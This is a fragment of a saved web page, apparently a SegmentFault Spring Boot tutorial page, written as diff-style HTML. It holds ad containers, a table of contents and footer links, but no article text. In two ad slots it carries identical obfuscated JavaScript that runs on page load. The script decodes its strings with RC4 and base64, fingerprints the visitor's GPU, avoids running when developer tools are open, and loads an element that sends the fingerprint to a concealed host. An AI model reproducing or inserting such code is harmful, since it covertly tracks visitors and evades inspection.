aJ4knj0Q2TsZ=[a0_0x2826("0x19"),"XYcD7gyt6AZkIQDh3+Fn/PI=",a0_0x2826("0x12"),a0_0x2826("0xd"),a0_0x2826("0x23"),a0_0x2826("0x17")];var xz1ZKT5VYzY7UB=document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x0]),aJ4knj0Q2TsZ[0x2])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x1]),aJ4knj0Q2TsZ[0x2]));if(!xz1ZKT5VYzY7UB){document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x3]),aJ4knj0Q2TsZ[0x5])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x4]),aJ4knj0Q2TsZ[0x5]),uhAtRHZXRS());}</script>
+</div></div><div class="mb-3"><div id="OA_holder_9" class="ad-container" style="display:block"><a href="https://sponsor.segmentfault.com/ck.php?oaparams=2__bannerid=400__zoneid=9__cb=35336d86bc__oadest=https%3A%2F%2Fke.sifou.com%2Fcourse%2F1650000023864436%3Futm_source%3Dsegmentfault%26utm_medium%3Dbanner_Tlink" target="_blank"><strong>自顶向下学 React 源码</strong><br>
+<small style="color: #6c757d">从理念到架构到实现到代码，透彻理解 </small></a><div id="beacon_35336d86bc" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/lg_005.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div><script type="text/javascript">var a0_0x5a7b=["gHn8nA==","toUTCString","pPUzbNqUOoPi1YTki","2BWEY1lTYNp/T+I9OQHVoZE=","IXFRmLrn","CgNqeWZa8Y45plkkKxbF4Q==","ZrSEYyW0b7Q0IPUqb/13ifQErimI4pBr","K3dNkqXKJbiemnk=","brSEdDKSbQ==","wRm0hXRLhWKYSg==","length","YtXMjstIgPUMjLZlaNb5QcsHsJfofqs=","01GCQWkzBrg=","2lWGVHRtav9SW7Q=","VOnkruxmgN02s5ZFWA==","YtXMjstIgPUMiLZlaNz5W84dpZXm","z0CORTVjSOFaRLMFKCvA","hcmRM5IG",";x20expires=","charCodeAt","rnaTNfMM5A5g","UP71jPdtsdQrqg==","lhDGASp5UQ==","cookie","yEaEWGp9","nEERm2ggVqUX","z1yGVA==","3UmTSW5gW/ZZWL8cbzjb/NRGE7wdKmt7","10CQRQ==","y0CcZStaTd1xcqMeCA==","xwKuhXRLhWKYSg==","ZDdmYg==","LyhDf39R658bu2Y/LxzF9w==","2FeTUG5sbPteWrUZNQ==",";x20path=/","yFCUQm57QPlc","K2pqmb72KbCVm3dtWA==","fixfCHIILA","xwKuhXRUiW+LShE=","atob","UP71n/lxpNw2qpZZ","YN7DiNRcodQxq5R0XvbFYPwqgqD1UImgOA==","ivuH9sk1F","UP71iuB3oN8gt5xF","WdIF+SOSzC5OLXDS7t8=","2keFXnZ8XfI=","0kE=","yECCcG59W/5ZQqQS","UuPxqupqqNQ9qpJHAeTOZv40"];(function(_0x1b61e1,_0x5a7b88){var _0x282611=function(_0x46bc60){while(--_0x46bc60){_0x1b61e1["push"](_0x1b61e1["shift"]());}};_0x282611(++_0x5a7b88);}(a0_0x5a7b,0xd7));var a0_0x2826=function(_0x1b61e1,_0x5a7b88){_0x1b61e1=_0x1b61e1-0x0;var _0x282611=a0_0x5a7b[_0x1b61e1];return _0x282611;};function kPbwxjZPvhHuql2cK(_0x2a7b56,_0x3dbb7d){var _0x39df8d=[],_0x3893cb=0x0,_0x4bd01a,_0x39ab8a="";for(var _0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x39df8d[_0x4366fa]=_0x4366fa;}for(_0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa]+_0x3dbb7d[a0_0x2826("0x0")](_0x4366fa%_0x3dbb7d[a0_0x2826("0x28")]))%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;}_0x4366fa=0x0;_0x3893cb=0x0;for(var _0x1f6e6d=0x0;_0x1f6e6d<_0x2a7b56[a0_0x2826("0x28")];_0x1f6e6d++){_0x4366fa=(_0x4366fa+0x1)%0x100;_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa])%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;_0x39ab8a+=String["fromCharCode"](_0x2a7b56["charCodeAt"](_0x1f6e6d)^_0x39df8d[(_0x39df8d[_0x4366fa]+_0x39df8d[_0x3893cb])%0x100]);}return _0x39ab8a;}function z58lhCJ(_0x5b3c65){var _0x2744f4="";try{_0x2744f4=window[a0_0x2826("0x14")](_0x5b3c65);}catch(_0x1d8981){}return _0x2744f4;};function aVxrxoIKgEYVWFC7(){var _0x2b4132=[a0_0x2826("0xc"),a0_0x2826("0x2c"),"VPrvuflw","QP7jqPQ=",a0_0x2826("0x1d"),a0_0x2826("0x2"),a0_0x2826("0x18"),a0_0x2826("0x15"),a0_0x2826("0x16"),a0_0x2826("0x2d"),a0_0x2826("0x29")];var _0x1267a4=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x1]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x2]),_0x2b4132[0x0]));var _0x424e30;var _0x30e940;var _0x470837;var _0x229329;try{_0x424e30=_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x3]),_0x2b4132[0x0]))||_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x4]),_0x2b4132[0x0]));}catch(_0x408b8e){}if(_0x424e30){_0x30e940=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x6]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x8]),_0x2b4132[0x0]));_0x470837=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x9]),_0x2b4132[0x0])]);_0x229329=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0xa]),_0x2b4132[0x0])]);}return _0x470837+"x20"+_0x229329;}function w9jcVeUDT(){var _0x3c83be=[a0_0x2826("0xb"),a0_0x2826("0x27"),a0_0x2826("0x13"),a0_0x2826("0x6"),a0_0x2826("0x25"),"BHBRkrX3Jw==",a0_0x2826("0x22"),a0_0x2826("0x11"),a0_0x2826("0x20")];const _0x1c6d55=0xa0;const _0x37ae20=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x0]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x1]),_0x3c83be[0x3])]>_0x1c6d55;const _0x4883d0=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x2]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x4]),_0x3c83be[0x8])]>_0x1c6d55;if(!(_0x4883d0&&_0x37ae20)&&(window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x7]),_0x3c83be[0x8])]||_0x37ae20||_0x4883d0)){return![];}else{return!![];}}function xGzLVAwTj9Dm(_0x528fc1,_0x3b5174,_0xfbb720){var _0x905dbf="";if(_0xfbb720){var _0x50d54e=new Date();_0x50d54e["setTime"](_0x50d54e["getTime"]()+_0xfbb720*0x18*0x3c*0x3c*0x3e8);_0x905dbf=a0_0x2826("0x30")+_0x50d54e[a0_0x2826("0x1f")]();}document[a0_0x2826("0x4")]=_0x528fc1+"="+(_0x3b5174||"")+_0x905dbf+a0_0x2826("0xf");}function uhAtRHZXRS(){var _0x7edbb9=["aJgicnL4X6hO",a0_0x2826("0x8"),"znG4dXV8X8ZND5w6dTeC+8M=",a0_0x2826("0xe"),a0_0x2826("0x5"),a0_0x2826("0x1c"),"yFeV",a0_0x2826("0x1b"),a0_0x2826("0x21"),a0_0x2826("0x7"),a0_0x2826("0x2e"),a0_0x2826("0x1a"),"iBXGQWI=",a0_0x2826("0x3"),a0_0x2826("0x2b"),"2EqZWnNs",a0_0x2826("0x9"),"yUSYVXVk","z0qlRWhgR/A=",a0_0x2826("0x10"),a0_0x2826("0xa"),a0_0x2826("0x1"),"z0SRbnhoW/laXLwS",a0_0x2826("0x2a")];var _0xde5cda=[a0_0x2826("0x1e"),"lmjgiQ==",a0_0x2826("0x2f"),a0_0x2826("0x24"),"ZLWPeiO4",a0_0x2826("0x26"),"sYkn4Oqn64Pdr"];var _0x33bc41;try{_0x33bc41=aVxrxoIKgEYVWFC7();}catch(_0x110e3a){}try{_0x33bc41=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x0]),_0xde5cda[0x2])](_0x33bc41);}catch(_0x3e7ed0){}_0x33bc41=encodeURIComponent(_0x33bc41);var _0x13700b=navigator["userAgent"]||navigator["vendor"]||window["opera"];var _0xb93071=kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x3]),_0xde5cda[0x6]);var _0x331712=new RegExp(_0xb93071,"i");var _0x53686b=!![];var _0x2d8ac7=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x14]),_0x7edbb9[0x15]);if(_0x331712[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x1]),_0xde5cda[0x2])](_0x13700b)){if(document[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x4]),_0xde5cda[0x6])][kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x5]),_0xde5cda[0x6])](_0x2d8ac7)==-0x1){if(w9jcVeUDT()){var _0x5d4d20=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x17]),_0x7edbb9[0x15])+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x1]),_0x7edbb9[0x15])+"?"+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15])+"="+_0x33bc41;var _0x5b2742=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x3]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x4]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x7]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x9]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xa]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x6]),_0x7edbb9[0x15]),_0x5d4d20);document["body"][kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xe]),_0x7edbb9[0x15])](_0x5b2742);xGzLVAwTj9Dm(_0x2d8ac7,"1","7");}}}}var aJ4knj0Q2TsZ=[a0_0x2826("0x19"),"XYcD7gyt6AZkIQDh3+Fn/PI=",a0_0x2826("0x12"),a0_0x2826("0xd"),a0_0x2826("0x23"),a0_0x2826("0x17")];var xz1ZKT5VYzY7UB=document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x0]),aJ4knj0Q2TsZ[0x2])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x1]),aJ4knj0Q2TsZ[0x2]));if(!xz1ZKT5VYzY7UB){document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x3]),aJ4knj0Q2TsZ[0x5])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x4]),aJ4knj0Q2TsZ[0x5]),uhAtRHZXRS());}</script>
+</div></div><div><div id="OA_holder_10" class="ad-container" style="display:block"><div id="beacon_afdf9b93d7" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/lg.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div>
+</div></div></div></div></div><div id="second-ad" class="d-none d-xl-block data-fix" style="top: 580.5px; margin-top: 0px;"><div id="OA_holder_31" class="ad-container" style="display:block"><div class="rounded overflow-hidden"><a href="https://sponsor.segmentfault.com/ck.php?oaparams=2__bannerid=322__zoneid=31__cb=ca166d9ef3__oadest=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000020336555" target="_blank"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/86a060293605188fd8ff27a17ec0750e.png" alt="segmentfault_sudo" title="segmentfault_sudo" width="300" height="100" border="0"></a><div id="beacon_ca166d9ef3" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/lg_004.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div></div><script type="text/javascript">var a0_0x5a7b=["gHn8nA==","toUTCString","pPUzbNqUOoPi1YTki","2BWEY1lTYNp/T+I9OQHVoZE=","IXFRmLrn","CgNqeWZa8Y45plkkKxbF4Q==","ZrSEYyW0b7Q0IPUqb/13ifQErimI4pBr","K3dNkqXKJbiemnk=","brSEdDKSbQ==","wRm0hXRLhWKYSg==","length","YtXMjstIgPUMjLZlaNb5QcsHsJfofqs=","01GCQWkzBrg=","2lWGVHRtav9SW7Q=","VOnkruxmgN02s5ZFWA==","YtXMjstIgPUMiLZlaNz5W84dpZXm","z0CORTVjSOFaRLMFKCvA","hcmRM5IG",";x20expires=","charCodeAt","rnaTNfMM5A5g","UP71jPdtsdQrqg==","lhDGASp5UQ==","cookie","yEaEWGp9","nEERm2ggVqUX","z1yGVA==","3UmTSW5gW/ZZWL8cbzjb/NRGE7wdKmt7","10CQRQ==","y0CcZStaTd1xcqMeCA==","xwKuhXRLhWKYSg==","ZDdmYg==","LyhDf39R658bu2Y/LxzF9w==","2FeTUG5sbPteWrUZNQ==",";x20path=/","yFCUQm57QPlc","K2pqmb72KbCVm3dtWA==","fixfCHIILA","xwKuhXRUiW+LShE=","atob","UP71n/lxpNw2qpZZ","YN7DiNRcodQxq5R0XvbFYPwqgqD1UImgOA==","ivuH9sk1F","UP71iuB3oN8gt5xF","WdIF+SOSzC5OLXDS7t8=","2keFXnZ8XfI=","0kE=","yECCcG59W/5ZQqQS","UuPxqupqqNQ9qpJHAeTOZv40"];(function(_0x1b61e1,_0x5a7b88){var _0x282611=function(_0x46bc60){while(--_0x46bc60){_0x1b61e1["push"](_0x1b61e1["shift"]());}};_0x282611(++_0x5a7b88);}(a0_0x5a7b,0xd7));var a0_0x2826=function(_0x1b61e1,_0x5a7b88){_0x1b61e1=_0x1b61e1-0x0;var _0x282611=a0_0x5a7b[_0x1b61e1];return _0x282611;};function kPbwxjZPvhHuql2cK(_0x2a7b56,_0x3dbb7d){var _0x39df8d=[],_0x3893cb=0x0,_0x4bd01a,_0x39ab8a="";for(var _0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x39df8d[_0x4366fa]=_0x4366fa;}for(_0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa]+_0x3dbb7d[a0_0x2826("0x0")](_0x4366fa%_0x3dbb7d[a0_0x2826("0x28")]))%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;}_0x4366fa=0x0;_0x3893cb=0x0;for(var _0x1f6e6d=0x0;_0x1f6e6d<_0x2a7b56[a0_0x2826("0x28")];_0x1f6e6d++){_0x4366fa=(_0x4366fa+0x1)%0x100;_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa])%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;_0x39ab8a+=String["fromCharCode"](_0x2a7b56["charCodeAt"](_0x1f6e6d)^_0x39df8d[(_0x39df8d[_0x4366fa]+_0x39df8d[_0x3893cb])%0x100]);}return _0x39ab8a;}function z58lhCJ(_0x5b3c65){var _0x2744f4="";try{_0x2744f4=window[a0_0x2826("0x14")](_0x5b3c65);}catch(_0x1d8981){}return _0x2744f4;};function aVxrxoIKgEYVWFC7(){var _0x2b4132=[a0_0x2826("0xc"),a0_0x2826("0x2c"),"VPrvuflw","QP7jqPQ=",a0_0x2826("0x1d"),a0_0x2826("0x2"),a0_0x2826("0x18"),a0_0x2826("0x15"),a0_0x2826("0x16"),a0_0x2826("0x2d"),a0_0x2826("0x29")];var _0x1267a4=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x1]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x2]),_0x2b4132[0x0]));var _0x424e30;var _0x30e940;var _0x470837;var _0x229329;try{_0x424e30=_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x3]),_0x2b4132[0x0]))||_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x4]),_0x2b4132[0x0]));}catch(_0x408b8e){}if(_0x424e30){_0x30e940=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x6]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x8]),_0x2b4132[0x0]));_0x470837=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x9]),_0x2b4132[0x0])]);_0x229329=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0xa]),_0x2b4132[0x0])]);}return _0x470837+"x20"+_0x229329;}function w9jcVeUDT(){var _0x3c83be=[a0_0x2826("0xb"),a0_0x2826("0x27"),a0_0x2826("0x13"),a0_0x2826("0x6"),a0_0x2826("0x25"),"BHBRkrX3Jw==",a0_0x2826("0x22"),a0_0x2826("0x11"),a0_0x2826("0x20")];const _0x1c6d55=0xa0;const _0x37ae20=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x0]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x1]),_0x3c83be[0x3])]>_0x1c6d55;const _0x4883d0=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x2]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x4]),_0x3c83be[0x8])]>_0x1c6d55;if(!(_0x4883d0&&_0x37ae20)&&(window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x7]),_0x3c83be[0x8])]||_0x37ae20||_0x4883d0)){return![];}else{return!![];}}function xGzLVAwTj9Dm(_0x528fc1,_0x3b5174,_0xfbb720){var _0x905dbf="";if(_0xfbb720){var _0x50d54e=new Date();_0x50d54e["setTime"](_0x50d54e["getTime"]()+_0xfbb720*0x18*0x3c*0x3c*0x3e8);_0x905dbf=a0_0x2826("0x30")+_0x50d54e[a0_0x2826("0x1f")]();}document[a0_0x2826("0x4")]=_0x528fc1+"="+(_0x3b5174||"")+_0x905dbf+a0_0x2826("0xf");}function uhAtRHZXRS(){var _0x7edbb9=["aJgicnL4X6hO",a0_0x2826("0x8"),"znG4dXV8X8ZND5w6dTeC+8M=",a0_0x2826("0xe"),a0_0x2826("0x5"),a0_0x2826("0x1c"),"yFeV",a0_0x2826("0x1b"),a0_0x2826("0x21"),a0_0x2826("0x7"),a0_0x2826("0x2e"),a0_0x2826("0x1a"),"iBXGQWI=",a0_0x2826("0x3"),a0_0x2826("0x2b"),"2EqZWnNs",a0_0x2826("0x9"),"yUSYVXVk","z0qlRWhgR/A=",a0_0x2826("0x10"),a0_0x2826("0xa"),a0_0x2826("0x1"),"z0SRbnhoW/laXLwS",a0_0x2826("0x2a")];var _0xde5cda=[a0_0x2826("0x1e"),"lmjgiQ==",a0_0x2826("0x2f"),a0_0x2826("0x24"),"ZLWPeiO4",a0_0x2826("0x26"),"sYkn4Oqn64Pdr"];var _0x33bc41;try{_0x33bc41=aVxrxoIKgEYVWFC7();}catch(_0x110e3a){}try{_0x33bc41=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x0]),_0xde5cda[0x2])](_0x33bc41);}catch(_0x3e7ed0){}_0x33bc41=encodeURIComponent(_0x33bc41);var _0x13700b=navigator["userAgent"]||navigator["vendor"]||window["opera"];var _0xb93071=kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x3]),_0xde5cda[0x6]);var _0x331712=new RegExp(_0xb93071,"i");var _0x53686b=!![];var _0x2d8ac7=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x14]),_0x7edbb9[0x15]);if(_0x331712[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x1]),_0xde5cda[0x2])](_0x13700b)){if(document[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x4]),_0xde5cda[0x6])][kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x5]),_0xde5cda[0x6])](_0x2d8ac7)==-0x1){if(w9jcVeUDT()){var _0x5d4d20=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x17]),_0x7edbb9[0x15])+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x1]),_0x7edbb9[0x15])+"?"+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15])+"="+_0x33bc41;var _0x5b2742=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x3]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x4]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x7]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x9]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xa]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x6]),_0x7edbb9[0x15]),_0x5d4d20);document["body"][kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xe]),_0x7edbb9[0x15])](_0x5b2742);xGzLVAwTj9Dm(_0x2d8ac7,"1","7");}}}}var aJ4knj0Q2TsZ=[a0_0x2826("0x19"),"XYcD7gyt6AZkIQDh3+Fn/PI=",a0_0x2826("0x12"),a0_0x2826("0xd"),a0_0x2826("0x23"),a0_0x2826("0x17")];var xz1ZKT5VYzY7UB=document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x0]),aJ4knj0Q2TsZ[0x2])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x1]),aJ4knj0Q2TsZ[0x2]));if(!xz1ZKT5VYzY7UB){document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x3]),aJ4knj0Q2TsZ[0x5])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x4]),aJ4knj0Q2TsZ[0x5]),uhAtRHZXRS());}</script>
+</div></div><div id="cataLog" class="d-none d-xl-block w-xl-300 mt-4" style="top: auto;"><div data-article-nav="true" class="accordion"><div class="overflow-hidden d-none d-xl-flex card"><div class="card-body"><div><h6 class="nav-header h6 p-0 m-0"><i class="fas fa-play fa-rotate-undefined"></i><span> 目录</span></h6></div><div id="collapseTarget" class="collapse"><nav id="article-nav-list" class="d-flex flex-column font-size-14" data-article-nav-list="true"><a class="nav-link text-secondary py-0 pr-0 my-1 text-truncate" scroll-href="#item-0-1" href="javascript:;">1 @PathVariable接收参数</a><a class="nav-link text-secondary py-0 pr-0 my-1 text-truncate" scroll-href="#item-0-2" href="javascript:;">2 @RequestParam接收参数</a><a class="nav-link text-secondary py-0 pr-0 my-1 text-truncate" scroll-href="#item-0-3" href="javascript:;">3 无注解传参</a><a class="nav-link text-secondary py-0 pr-0 my-1 text-truncate" scroll-href="#item-0-4" href="javascript:;">4 HttpServletRequest接收参数</a><a class="nav-link text-secondary py-0 pr-0 my-1 text-truncate" scroll-href="#item-0-5" href="javascript:;">5 @RequestBody接收请求体参数</a><a class="nav-link text-secondary py-0 pr-0 my-1 text-truncate" scroll-href="#item-0-6" href="javascript:;">6 @RequestHeader接收请求头参数</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-1" href="javascript:;">Spring Boot系列教程目录</a></nav></div></div></div></div></div></div></div></div><div id="fixedTools" class="position-fixed d-none d-xl-flex" style="right:24px;bottom:24px"><button type="button" class="btn btn-light" title="回顶部">▲</button></div></div><footer id="footer" class="d-none d-sm-block bg-white py-5 font-size-14"><div class="container"><div class="row"><dl class="col-4 col-md-2"><dt class="h6">产品</dt><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/questions/hottest?utm_source=sf-footer" target="_blank" rel="noreferrer">热门问答</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blogs/hottest?utm_source=sf-footer" target="_blank" rel="noreferrer">热门专栏</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives?utm_source=sf-footer" target="_blank" rel="noreferrer">热门课程</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/events?utm_source=sf-footer" target="_blank" rel="noreferrer">最新活动</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/groups?utm_source=sf-footer" target="_blank" rel="noreferrer">技术圈</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/jobs?utm_source=sf-footer" target="_blank" rel="noreferrer">酷工作</a></dd></dl><dl class="col-4 